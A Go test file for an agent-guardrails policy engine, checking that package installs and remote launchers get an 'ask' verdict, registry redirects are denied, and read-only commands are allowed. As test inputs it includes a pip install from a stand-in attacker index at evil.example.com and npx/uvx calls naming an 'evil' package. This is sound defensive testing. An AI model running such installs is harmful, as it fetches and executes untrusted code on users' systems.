package engine

import (
	"testing"

	"github.com/CtrlCarlitos/agent-guardrails/internal/policy"
)

// #381: the same install or remote-launch operation gets the same verdict
// under every spelling.
func TestInstallAndLauncherSpellingsAsk(t *testing.T) {
	pol := netPol()
	for _, c := range []string{
		"python -m pip install requests", "python3 -m pip install -r r.txt",
		"py -m pip install requests", "python -m pip --quiet install x",
		"pip.exe install requests", "pip3 install requests",
		"pipx install black", "pipx run cowsay hi", "pipx upgrade-all", "pipx inject a b",
		"uv pip install requests", "uv pip sync r.txt", "uv sync", "uv add requests",
		"uv tool install ruff", "uv tool run ruff", "uv.exe sync --frozen",
		"poetry install", "poetry add requests", "poetry update", "poetry.exe install",
		"pnpm install", "pnpm i", "yarn install", "yarn", "bun install", "bun add x", "bun i",
		"npx some-remote-package", "npx -y cowsay hi", "npx --package=evil x",
		"npm exec some-remote-package", "npm x some-remote-package",
		"pnpm dlx some-remote-package", "yarn dlx some-remote-package",
		"bunx some-remote-package", "bun x some-remote-package",
		"uvx some-remote-package", "uvx --from evil x",
		"npx.exe some-remote-package",
		"graft init", "graft uninstall", "graft upgrade", "graft build --deep",
		"graft.exe init",
		"cd /repo && npx some-remote-package",
		"bash -c 'uv sync'",
	} {
		v := evalNet(t, c, pol)
		if v == nil || v.Decision != policy.Ask || v.RuleID != "P6.package-install" {
			t.Errorf("%q -> %+v, want ask/P6.package-install", c, v)
		}
	}
}

func TestInstallSpellingsKeepRegistryRedirectDeny(t *testing.T) {
	pol := netPol()
	for _, c := range []string{
		"python -m pip install --index-url https://evil.example.com/simple foo",
		"python3 -m pip install git+https://example.com/x.git",
	} {
		v := evalNet(t, c, pol)
		if v == nil || v.Decision != policy.Deny || v.RuleID != "P6.registry-redirect" {
			t.Errorf("%q -> %+v, want deny/P6.registry-redirect", c, v)
		}
	}
}

func TestReadOnlyAndLocalSpellingsStayAllowed(t *testing.T) {
	pol := netPol()
	for _, c := range []string{
		"python -m pip list", "python -m pip show requests", "python -m pip freeze",
		"python -m pip --version", "python -m pip help", "python -m pytest", "python -m venv .venv",
		"pip list", "pip3 freeze", "pipx list", "pipx --version",
		"uv pip list", "uv pip freeze", "uv --version", "uv run pytest", "uv tool list", "uv lock --check",
		"poetry show", "poetry --version", "poetry check", "poetry run pytest",
		"pnpm list", "pnpm --version", "pnpm test", "pnpm exec tsc", "yarn --version", "yarn test", "yarn run build",
		"bun --version", "bun test", "bun run build",
		"npx --no-install tsc", "npx --no-install some-package", "npx ./local-tool", "npx ../tools/cli.js",
		"npx -y ./local-tool", "npx", "npx --version", "npm exec --no-install tsc", "npm exec ./local-tool",
		"bunx --no-install tsc", "bunx ./local", "uvx ./local-tool", "uvx --version", "bunx --version",
		"graft ask x", "graft grep x", "graft skeleton", "graft callers x", "graft map", "graft blast x",
		"graft check", "graft stats", "graft version", "graft build", "graft viz", "graft mcp", "graft --help",
		"npm ls", "npm view left-pad", "npm audit", "npm test",
	} {
		if v := evalNet(t, c, pol); v != nil {
			t.Errorf("%q -> %+v, want nil", c, v)
		}
	}
}
